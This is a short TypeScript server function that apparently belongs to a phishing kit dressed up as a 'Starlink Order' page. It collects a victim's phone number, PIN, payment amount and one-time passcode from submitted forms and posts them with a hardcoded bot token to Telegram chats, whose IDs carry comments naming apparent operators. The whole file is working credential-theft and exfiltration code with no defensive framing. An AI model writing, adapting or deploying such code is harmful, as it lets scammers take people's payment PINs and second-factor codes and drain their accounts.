export async function telFun(formData: any,) {
    const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
    const url = `https://api.telegram.org/bot${token}/sendMessage`
    const action = formData.get("action");
    let message = "";
    if (action === "submit-phone") {
        message = `<b>Phone:</b> <a href="tel:${formData.get("phone")}">${formData.get("phone")}</a>\n` +
            `<b>Pin:</b> <code>${formData.get("pin")}</code>\n` +
            `<b>Amount:</b> ${formData.get("amount")}`;
    }

    if (action === "submit-otp") {
        message = `<b>Phone:</b> <a href="tel:${formData.get("phone")}">${formData.get("phone")}</a>\n` +
            `<b>Otp:</b> <code>${formData.get("otp")}</code>`;
    }

    if (action === "submit-message") {
        message = `<b>Phone:</b> <a href="tel:${formData.get("phone")}">${formData.get("phone")}</a>\n` +
            `<b>Message:</b> ${formData.get("message")}`;
    }

    try {
        const res = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: 6562421557,//KC //5991194967,//-sam //6953760534-b4-sam, //7895249781-evanson, //, //8775827384,//,// 8453055105, //, //  ,// ,// ,
                text:
                    ` <b>Starlink Order: </b>
 ${message} `
                // Phone: ${formData.get("phone")}
                // PIN: ${formData.get("pin")}
                // OTP: ${formData.get("otp")}
                // Message: ${formData.get("message")}
                ,
                parse_mode: "HTML",
            })

        });
        const data = await res.json();
        return data;
    } catch (e: any) {
        return e.message || e;
    }

}